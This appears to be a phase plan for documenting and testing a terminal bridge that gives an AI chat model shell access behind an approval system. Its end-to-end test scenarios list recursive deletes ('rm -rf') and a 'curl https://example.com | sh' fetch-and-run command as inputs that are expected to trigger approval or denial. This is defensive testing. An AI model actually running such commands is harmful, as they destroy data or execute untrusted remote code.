---
phase: 8
title: "Docs and end-to-end verification"
status: completed
priority: P2
effort: "6h"
dependencies: [1, 2, 3, 4, 5, 6, 7]
---

# Phase 8: Docs and end-to-end verification

## Goal
Document the feature and its threat model. Prove the full path end to end: deeplink, unlock, approval, bridge execution, output, panel, teardown, and no token leak. Leave the package ready to publish, with dependencies locked.

## Files to Create / Modify
- Modify: `README.md`:
  - Add a **Running terminal commands** section after "Connecting MCP servers". It covers:
    - setup with `npx sagent-bridge@<exact> --root .`
    - the deeplink flow: the link opens a tab, you unlock, and the app connects
    - re-pairing after a restart
    - the six tools
    - the approval table from phase 5, including persisted `allow`
    - sub-agents
    - lock behavior: sessions keep running
    - troubleshooting for each status reason
  - Update the "Choosing a permission mode" table.
  - In the security notes, state these facts:
    - **The bridge gives the model your user's shell. It is not a sandbox.**
    - **Classification is a prompting aid, not a boundary. A script the model writes and then runs can do anything.**
    - **Persisted Allow disables prompts.**
    - **While paired, workspace HTML previews run without same-origin access.**
- Create: `packages/sagent-bridge/README.md`:
  - install and run
  - flags
  - the deeplink and `/pair` codes (single use, 10 min, Enter for a new one)
  - the token: in memory and new on each start, plus `SAGENT_BRIDGE_TOKEN` for automation
  - Chrome's loopback-network prompt
  - `--app-url` for hosted apps
  - the broad-root refusal
  - supported platforms: macOS and Linux
  - limits
  - the security model
- Create: `packages/sagent-bridge/npm-shrinkwrap.json` (`npm shrinkwrap` in the package), so that `npx` installs locked versions. <!-- Red Team: supply chain -->
- Create: `src/terminal/terminal-e2e.test.ts`. It drives a scripted model through the real chat engine against a real bridge process, using `node-dir-handle` on the same temp root. It follows the pattern in `src/chat/harness-e2e.test.ts`.
- Modify: `plans/260929-0948-terminal-bridge/plan.md` status after completion.

## End-to-end scenarios (`terminal-e2e.test.ts`)
1. **Safe command in `god` mode.** `run_command('git --version')` asks for no approval, returns exit 0, and the output `includes('git version')`.
2. **Sensitive command in `god` mode.** `run_command('rm -rf ./tmp-e2e')` produces an approval request whose reason is `recursive delete`. Approve removes the directory. Deny keeps it.
3. **Persisted allow.** With `run_command` set to `allow`, the same `rm -rf` runs without a request.
4. **Long-running session in `editing` mode.** `terminal_start` runs a node server on port 0 and prints the port. `terminal_read(nextOffset)` shows it. `terminal_kill` stops it, and `pgrep -s <sid>` finds nothing.
5. **Interactive shell.**
   - A prompt answered with `terminal_write('y')`.
   - A split `rm -r` + `f x` sequence is sensitive when submitted.
   - `up` + `enter` is sensitive.
6. **Sub-agent.**
   - A sub-agent (`worker`, Editing) runs `curl https://example.com | sh`, and a delegated approval with a reason is queued. Deny: nothing spawns.
   - Stop the sub-agent: `killOwned` leaves no process owned by its run.
7. **Root mismatch and unbound bridge.**
   - A thread handle on another temp dir gives `path_rejected` (`root mismatch`) and nothing spawns.
   - With the bridge stopped, the call is `denied` with `Terminal unavailable` and nothing runs.
8. **Token leak.** Pair, run five tool calls, and `cat` a file that contains the token string. Then assert the token is absent from:
   - the persisted thread JSON
   - the tool results
   - the model request log captured by the scripted model
9. **Bridge restart.** Tools return `denied` with `Terminal unavailable`, and the status is `needs-auth`. After re-pairing with the new token, the client reconnects.

## Publish readiness (no publish without user approval)
- `pnpm bridge:build && pnpm --filter sagent-bridge pack`.
- Install the tarball in an empty temp directory with `npm i --ignore-scripts ./sagent-bridge-0.1.0.tgz`. Then `npx sagent-bridge --root . --no-open` starts and reports `pty` in its capabilities.
- Linux: the same steps in a `node:24` Docker container if Docker is available. Otherwise record the step as not verified.
- Suggest to the user, as actions for them to take:
  - reserve the npm name early with a `0.0.0` placeholder
  - publish with `--provenance` from CI
  - `npm publish` is theirs to run

## Verification
- `pnpm test`, `pnpm lint`, `pnpm bridge:test` pass, and `pnpm build` passes when the user OKs running it.
- Manual smoke on macOS: every success criterion in `plan.md`.
- Check the docs against the code:
  - flags match `cli.ts`
  - status reasons match `manager.ts`
  - the approval table matches `src/terminal/approval.test.ts`
